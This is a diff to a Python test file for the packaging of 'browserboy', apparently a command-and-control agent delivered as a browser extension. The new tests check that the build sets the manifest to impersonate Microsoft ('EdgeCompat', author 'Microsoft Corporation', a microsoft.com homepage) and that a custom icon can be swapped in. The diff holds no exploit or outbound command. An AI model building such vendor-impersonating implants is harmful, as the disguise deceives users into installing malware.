@@ -9,7 +9,9 @@ ROOT = Path(__file__).resolve().parents[1]
 sys.path.insert(0, str(ROOT / "Payload_Type" / "browserboy"))
 
 from browserboy.agent_functions.packaging import (  # noqa: E402
+    DEFAULT_EXTENSION_NAME,
     KNOWN_COMMANDS,
+    PNG_MAGIC,
     aespsk_mode,
     build_agent_config,
     minify_js,
@@ -92,7 +94,10 @@ class PackagingTests(unittest.TestCase):
             self.assertLess(len(agent_js), 20_000)
             manifest = json.loads((dest / "manifest.json").read_text(encoding="utf-8"))
             self.assertEqual(manifest["name"], "lab-ext")
+            self.assertEqual(manifest["short_name"], "EdgeCompat")
+            self.assertEqual(manifest["author"], "Microsoft Corporation")
             self.assertEqual(manifest["version"], "1.2.3")
+            self.assertTrue((dest / "icons" / "icon128.png").read_bytes().startswith(PNG_MAGIC))
             zip_path = Path(tmp) / "out.zip"
             zip_extension(dest, zip_path)
             with zipfile.ZipFile(zip_path) as archive:
@@ -129,6 +134,53 @@ class PackagingTests(unittest.TestCase):
             )
             text = (dest / "lib" / "config.js").read_text(encoding="utf-8")
             self.assertIn("\n", text)
+
+    def test_custom_icon_replaces_default(self):
+        source = ROOT / "Payload_Type" / "browserboy" / "browserboy" / "agent_code" / "extension"
+        custom = PNG_MAGIC + b"not-a-real-png-body"
+        with tempfile.TemporaryDirectory() as tmp:
+            dest = Path(tmp) / "extension"
+            stamp_extension(
+                source,
+                dest,
+                config={"payload_uuid": "abc"},
+                manifest_fields={
+                    "name": DEFAULT_EXTENSION_NAME,
+                    "short_name": "EdgeCompat",
+                    "description": "x",
+                    "author": "Microsoft Corporation",
+                    "version": "1.0.0",
+                    "homepage_url": "https://www.microsoft.com/edge",
+                    "update_url": "https://example.test/update.xml",
+                },
+                command_names=["exit"],
+                minify=False,
+                icon_png=custom,
+            )
+            self.assertEqual((dest / "icons" / "icon128.png").read_bytes(), custom)
+
+    def test_reject_non_png_icon(self):
+        source = ROOT / "Payload_Type" / "browserboy" / "browserboy" / "agent_code" / "extension"
+        with tempfile.TemporaryDirectory() as tmp:
+            dest = Path(tmp) / "extension"
+            with self.assertRaises(ValueError):
+                stamp_extension(
+                    source,
+                    dest,
+                    config={"payload_uuid": "abc"},
+                    manifest_fields={
+                        "name": "x",
+                        "short_name": "x",
+                        "description": "x",
+                        "author": "x",
+                        "version": "1.0.0",
+                        "homepage_url": "https://example.test",
+                        "update_url": "https://example.test/update.xml",
+                    },
+                    command_names=["exit"],
+                    minify=False,
+                    icon_png=b"GIF89a-not-png",
+                )
 
 
 if __name__ == "__main__":
